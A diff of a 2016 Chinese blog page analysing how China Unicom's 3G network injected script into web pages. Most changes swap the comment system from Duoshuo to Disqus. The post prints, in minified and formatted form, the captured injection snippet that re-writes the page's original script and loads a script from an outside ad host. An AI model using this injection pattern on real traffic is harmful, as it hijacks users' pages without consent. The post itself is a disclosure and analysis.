@@ -85,11 +85,13 @@
 
 
 <meta name="description" content="&amp;#x5728;&amp;#x7528;&amp;#x624B;&amp;#x673A;&amp;#x4E0A;&amp;#x7F51;&amp;#x7684;&amp;#x65F6;&amp;#x5019;&amp;#x7ECF;&amp;#x5E38;&amp;#x4F1A;&amp;#x51FA;&amp;#x73B0;&amp;#x6D41;&amp;#x91CF;&amp;#x6761;, &amp;#x5176;&amp;#x5B9E;&amp;#x5C31;&amp;#x662F;&amp;#x8054;&amp;#x901A;&amp;#x5E72;&amp;#x768">
+<meta name="keywords" content="js">
 <meta property="og:type" content="article">
 <meta property="og:title" content="联通3G劫持分析">
 <meta property="og:url" content="http://blog.imspace.cn/2016/05/30/联通3G劫持分析/index.html">
 <meta property="og:site_name" content="空格的空地">
 <meta property="og:description" content="&amp;#x5728;&amp;#x7528;&amp;#x624B;&amp;#x673A;&amp;#x4E0A;&amp;#x7F51;&amp;#x7684;&amp;#x65F6;&amp;#x5019;&amp;#x7ECF;&amp;#x5E38;&amp;#x4F1A;&amp;#x51FA;&amp;#x73B0;&amp;#x6D41;&amp;#x91CF;&amp;#x6761;, &amp;#x5176;&amp;#x5B9E;&amp;#x5C31;&amp;#x662F;&amp;#x8054;&amp;#x901A;&amp;#x5E72;&amp;#x768">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://blog.imspace.cn/2016/05/30/联通3G劫持分析/hehe.jpg">
 <meta property="og:updated_time" content="2016-06-12T17:31:25.806Z">
 <meta name="twitter:card" content="summary">
@@ -107,8 +109,8 @@
     fancybox: true,
     motion: true,
     duoshuo: {
-      userId: 504804,
-      author: '空格哥哥'
+      userId: undefined,
+      author: '博主'
     }
   };
 </script>
@@ -329,7 +331,7 @@
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
                 <a href="/2016/05/30/联通3G劫持分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/30/联通3G劫持分析/" itemprop="commentsCount"></span>
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/30/联通3G劫持分析/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -359,9 +361,9 @@
       
         <p>&#x5728;&#x7528;&#x624B;&#x673A;&#x4E0A;&#x7F51;&#x7684;&#x65F6;&#x5019;&#x7ECF;&#x5E38;&#x4F1A;&#x51FA;&#x73B0;&#x6D41;&#x91CF;&#x6761;, &#x5176;&#x5B9E;&#x5C31;&#x662F;&#x8054;&#x901A;&#x5E72;&#x7684;&#x52AB;&#x6301;.  </p>
 <p>&#x7528;&#x7535;&#x8111;&#x6293;&#x5305;&#x622A;&#x83B7;&#x4EE5;&#x4E0B;&#x811A;&#x672C;, &#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x4F1A;&#x51FA;&#x73B0;&#x5728;&#x6BCF;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;js&#x4E2D;&#x5E76;&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;&#x5185;&#x5BB9;.  </p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="function"><span class="keyword">function</span>(<span class="params">x,s,t,p,z</span>)</span>{<span class="keyword">var</span> a=x.getElementsByTagName(<span class="string">&apos;script&apos;</span>),b=<span class="string">&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;&apos;</span>+s+z+<span class="string">&apos;_p=1234&apos;</span>+<span class="string">&apos;&quot; &apos;</span>,c,d,e,f,g;<span class="keyword">for</span>(c <span class="keyword">in</span> a){f=a[c];<span class="keyword">if</span>(<span class="keyword">typeof</span> f===<span class="string">&apos;object&apos;</span>){<span class="keyword">if</span>(f.src.toLowerCase()===s){d=f.attributes;<span class="keyword">for</span>(e <span class="keyword">in</span> d){g=d[e];<span class="keyword">if</span>(<span class="keyword">typeof</span> g===<span class="string">&apos;object&apos;</span>&amp;&amp;g.name!==<span class="string">&apos;src&apos;</span>){b+=g.name+<span class="string">&apos;=&quot;&apos;</span>+g.value+<span class="string">&apos;&quot; &apos;</span>;}}b+=<span class="string">&apos;&gt;&lt;/script&gt;&apos;</span>;x.write(b);<span class="keyword">break</span>;}}}x.write(<span class="string">&apos;&lt;scr&apos;</span>+<span class="string">&apos;ipt type=&quot;text/javascript&quot; src=&quot;&apos;</span>+t+<span class="string">&apos;p=&apos;</span>+p+<span class="string">&apos;&amp;mt=&apos;</span>+<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()+<span class="string">&apos;&quot;&gt;&lt;/scr&apos;</span>+<span class="string">&apos;ipt&gt;&apos;</span>);})(<span class="built_in">document</span>,<span class="string">&apos;http://jwch.fzu.edu.cn/js/tab.js&apos;</span>,<span class="string">&apos;http://fj.kk3g.net/fujian_apiv2/mainjs/analysis?&apos;</span>,<span class="string">&apos;zfau2mj48AX61VpGARmnwEF6z5DfcZOy77axBbkdgiiq4mnnDCKWVP2HMQLxVxLY3JR00zIGCzRNxpMU4OWEiOUS%2FeBDTLQdt9SfrQjY3cowLdUJ6gTOdoPjmrEtalWqZ5NamQdtuEZupOQCDDxW9VME83lwobSv80Hf0%2BH3KCmviVNxiadp5uJA08D56DhPBRYojU6HclZviU6DEV%2BUxugRJktDna5RguTglc7DSjc2J5Zt2e9fdIt6CDAxN1ctR75uKQoDDd4=&apos;</span>,<span class="string">&apos;?&apos;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;(<span class="function"><span class="keyword">function</span>(<span class="params">x,s,t,p,z</span>)</span>{<span class="keyword">var</span> a=x.getElementsByTagName(<span class="string">&apos;script&apos;</span>),b=<span class="string">&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;&apos;</span>+s+z+<span class="string">&apos;_p=1234&apos;</span>+<span class="string">&apos;&quot; &apos;</span>,c,d,e,f,g;<span class="keyword">for</span>(c <span class="keyword">in</span> a){f=a[c];<span class="keyword">if</span>(<span class="keyword">typeof</span> f===<span class="string">&apos;object&apos;</span>){<span class="keyword">if</span>(f.src.toLowerCase()===s){d=f.attributes;<span class="keyword">for</span>(e <span class="keyword">in</span> d){g=d[e];<span class="keyword">if</span>(<span class="keyword">typeof</span> g===<span class="string">&apos;object&apos;</span>&amp;&amp;g.name!==<span class="string">&apos;src&apos;</span>){b+=g.name+<span class="string">&apos;=&quot;&apos;</span>+g.value+<span class="string">&apos;&quot; &apos;</span>;}}b+=<span class="string">&apos;&gt;&lt;/script&gt;&apos;</span>;x.write(b);<span class="keyword">break</span>;}}}x.write(<span class="string">&apos;&lt;scr&apos;</span>+<span class="string">&apos;ipt type=&quot;text/javascript&quot; src=&quot;&apos;</span>+t+<span class="string">&apos;p=&apos;</span>+p+<span class="string">&apos;&amp;mt=&apos;</span>+<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()+<span class="string">&apos;&quot;&gt;&lt;/scr&apos;</span>+<span class="string">&apos;ipt&gt;&apos;</span>);})(<span class="built_in">document</span>,<span class="string">&apos;http://jwch.fzu.edu.cn/js/tab.js&apos;</span>,<span class="string">&apos;http://fj.kk3g.net/fujian_apiv2/mainjs/analysis?&apos;</span>,<span class="string">&apos;zfau2mj48AX61VpGARmnwEF6z5DfcZOy77axBbkdgiiq4mnnDCKWVP2HMQLxVxLY3JR00zIGCzRNxpMU4OWEiOUS%2FeBDTLQdt9SfrQjY3cowLdUJ6gTOdoPjmrEtalWqZ5NamQdtuEZupOQCDDxW9VME83lwobSv80Hf0%2BH3KCmviVNxiadp5uJA08D56DhPBRYojU6HclZviU6DEV%2BUxugRJktDna5RguTglc7DSjc2J5Zt2e9fdIt6CDAxN1ctR75uKQoDDd4=&apos;</span>,<span class="string">&apos;?&apos;</span>);</div></pre></td></tr></table></figure>
 <a id="more"></a>
-<p>&#x7A0D;&#x5FAE;&#x683C;&#x5F0F;&#x5316;&#x4E00;&#x4E0B;:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">x, s, t, p, z</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> a = x.getElementsByTagName(<span class="string">&apos;script&apos;</span>),</span><br><span class="line">    b = <span class="string">&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;&apos;</span> + s + z + <span class="string">&apos;_p=1234&apos;</span> + <span class="string">&apos;&quot; &apos;</span>,</span><br><span class="line">    c,d,e,f,g;</span><br><span class="line">    <span class="keyword">for</span> (c <span class="keyword">in</span> a) {</span><br><span class="line">        f = a[c];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> f === <span class="string">&apos;object&apos;</span>) {</span><br><span class="line">            <span class="keyword">if</span> (f.src.toLowerCase() === s) {</span><br><span class="line">                d = f.attributes;</span><br><span class="line">                <span class="keyword">for</span> (e <span class="keyword">in</span> d) {</span><br><span class="line">                    g = d[e];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> g === <span class="string">&apos;object&apos;</span> &amp;&amp; g.name !== <span class="string">&apos;src&apos;</span>) {</span><br><span class="line">                        b += g.name + <span class="string">&apos;=&quot;&apos;</span> + g.value + <span class="string">&apos;&quot; &apos;</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                b += <span class="string">&apos;&gt;&lt;/script&gt;&apos;</span>;</span><br><span class="line">                x.write(b);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    x.write(<span class="string">&apos;&lt;scr&apos;</span> + <span class="string">&apos;ipt type=&quot;text/javascript&quot; src=&quot;&apos;</span> + t + <span class="string">&apos;p=&apos;</span> + p + <span class="string">&apos;&amp;mt=&apos;</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() + <span class="string">&apos;&quot;&gt;&lt;/scr&apos;</span> + <span class="string">&apos;ipt&gt;&apos;</span>);</span><br><span class="line">})(</span><br><span class="line">    <span class="built_in">document</span>, </span><br><span class="line">    <span class="string">&apos;http://jwch.fzu.edu.cn/js/tab.js&apos;</span>, </span><br><span class="line">    <span class="string">&apos;http://fj.kk3g.net/fujian_apiv2/mainjs/analysis?&apos;</span>, </span><br><span class="line">    <span class="string">&apos;zfau2mj48AX61VpGARmnwEF6z5DfcZOy77axBbkdgiiq4mnnDCKWVP2HMQLxVxLY3JR00zIGCzRNxpMU4OWEiOUS%2FeBDTLQdt9SfrQjY3cowLdUJ6gTOdoPjmrEtalWqZ5NamQdtuEZupOQCDDxW9VME83lwobSv80Hf0%2BH3KCmviVNxiadp5uJA08D56DhPBRYojU6HclZviU6DEV%2BUxugRJktDna5RguTglc7DSjc2J5Zt2e9fdIt6CDAxN1ctR75uKQoDDd4=&apos;</span>, </span><br><span class="line">    <span class="string">&apos;?&apos;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>&#x7A0D;&#x5FAE;&#x683C;&#x5F0F;&#x5316;&#x4E00;&#x4E0B;:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">x, s, t, p, z</span>) </span>{</div><div class="line">    <span class="keyword">var</span> a = x.getElementsByTagName(<span class="string">&apos;script&apos;</span>),</div><div class="line">    b = <span class="string">&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;&apos;</span> + s + z + <span class="string">&apos;_p=1234&apos;</span> + <span class="string">&apos;&quot; &apos;</span>,</div><div class="line">    c,d,e,f,g;</div><div class="line">    <span class="keyword">for</span> (c <span class="keyword">in</span> a) {</div><div class="line">        f = a[c];</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> f === <span class="string">&apos;object&apos;</span>) {</div><div class="line">            <span class="keyword">if</span> (f.src.toLowerCase() === s) {</div><div class="line">                d = f.attributes;</div><div class="line">                <span class="keyword">for</span> (e <span class="keyword">in</span> d) {</div><div class="line">                    g = d[e];</div><div class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> g === <span class="string">&apos;object&apos;</span> &amp;&amp; g.name !== <span class="string">&apos;src&apos;</span>) {</div><div class="line">                        b += g.name + <span class="string">&apos;=&quot;&apos;</span> + g.value + <span class="string">&apos;&quot; &apos;</span>;</div><div class="line">                    }</div><div class="line">                }</div><div class="line">                b += <span class="string">&apos;&gt;&lt;/script&gt;&apos;</span>;</div><div class="line">                x.write(b);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            }</div><div class="line">        }</div><div class="line">    }</div><div class="line">    x.write(<span class="string">&apos;&lt;scr&apos;</span> + <span class="string">&apos;ipt type=&quot;text/javascript&quot; src=&quot;&apos;</span> + t + <span class="string">&apos;p=&apos;</span> + p + <span class="string">&apos;&amp;mt=&apos;</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() + <span class="string">&apos;&quot;&gt;&lt;/scr&apos;</span> + <span class="string">&apos;ipt&gt;&apos;</span>);</div><div class="line">})(</div><div class="line">    <span class="built_in">document</span>, </div><div class="line">    <span class="string">&apos;http://jwch.fzu.edu.cn/js/tab.js&apos;</span>, </div><div class="line">    <span class="string">&apos;http://fj.kk3g.net/fujian_apiv2/mainjs/analysis?&apos;</span>, </div><div class="line">    <span class="string">&apos;zfau2mj48AX61VpGARmnwEF6z5DfcZOy77axBbkdgiiq4mnnDCKWVP2HMQLxVxLY3JR00zIGCzRNxpMU4OWEiOUS%2FeBDTLQdt9SfrQjY3cowLdUJ6gTOdoPjmrEtalWqZ5NamQdtuEZupOQCDDxW9VME83lwobSv80Hf0%2BH3KCmviVNxiadp5uJA08D56DhPBRYojU6HclZviU6DEV%2BUxugRJktDna5RguTglc7DSjc2J5Zt2e9fdIt6CDAxN1ctR75uKQoDDd4=&apos;</span>, </div><div class="line">    <span class="string">&apos;?&apos;</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
 <p>&#x7A0D;&#x5FAE;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x5C31;&#x77E5;&#x9053;&#x4ED6;&#x662F;&#x590D;&#x5236;&#x4E86;&#x539F;&#x5148;&#x7684; script &#x6807;&#x7B7E;&#x7684;&#x5185;&#x5BB9;, &#x7136;&#x540E;&#x5728;&#x540E;&#x9762;&#x52A0;&#x4E0A;_p=1234, &#x518D;&#x52A0;&#x8FDB;&#x53BB;, &#x5C31;&#x83B7;&#x53D6;&#x4E86;&#x539F;&#x5148;js&#x7684;&#x5185;&#x5BB9;.<br>&#x6700;&#x540E;&#x4E00;&#x884C;&#x518D;&#x628A; kk3g &#x7684; script&#x6807;&#x7B7E;&#x6254;&#x8FDB;&#x53BB;, qj&#x4F60;&#x7684;&#x9875;&#x9762;, &#x52A0;&#x4E0A;&#x6D41;&#x91CF;&#x5565;&#x7684;<br>&#x5DF2;&#x7ECF;&#x6253;&#x7535;&#x8BDD;&#x7ED9;&#x8054;&#x901A;&#x4E86;, &#x5BA2;&#x670D;&#x8BF4;&#x6280;&#x672F;&#x4EBA;&#x5458;&#x7B49;&#x4E0B;&#x8054;&#x7CFB;&#x6211;, &#x5230;&#x73B0;&#x5728;&#x4E5F;&#x6CA1;&#x8054;&#x7CFB;&#x6211;  </p>
 <p>&#x4E00;&#x8D77;&#x6765;&#x6B23;&#x8D4F;&#x4E00;&#x4E0B;&#x4ED6;&#x7684;<del>&#x72D7;&#x5C4E;</del>&#x4E3B;&#x9875;:<br><img src="/2016/05/30/&#x8054;&#x901A;3G&#x52AB;&#x6301;&#x5206;&#x6790;/hehe.jpg" alt=""></p>
 
@@ -419,25 +421,6 @@
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/05/30/联通3G劫持分析/"
-     data-title="联通3G劫持分析"
-     data-content=""
-     data-url="http://blog.imspace.cn/2016/05/30/联通3G劫持分析/">
-  <div class="ds-share-inline">
-    <ul  class="ds-share-icons-16">
-
-      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
-      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
-      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
-      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
-      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
-
-    </ul>
-    <div class="ds-share-icons-more">
-    </div>
-  </div>
-</div>
-      
     </div>
   </div>
 
@@ -449,8 +432,11 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/05/30/联通3G劫持分析/"
-           data-title="联通3G劫持分析" data-url="http://blog.imspace.cn/2016/05/30/联通3G劫持分析/">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
       </div>
     
   </div>
@@ -716,32 +702,30 @@
 
   
 
-  
-    
-  
 
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"imspace3"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
 
   
-    
+
+    <script type="text/javascript">
+      var disqus_shortname = 'imspace';
+      var disqus_identifier = '2016/05/30/联通3G劫持分析/';
+      var disqus_title = "联通3G劫持分析";
+      var disqus_url = 'http://blog.imspace.cn/2016/05/30/联通3G劫持分析/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
       
-      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
-      <script src="/js/src/hook-duoshuo.js"></script>
-    
+        run_disqus_script('embed.js');
+      
+    </script>
   
-
-
 
 
 
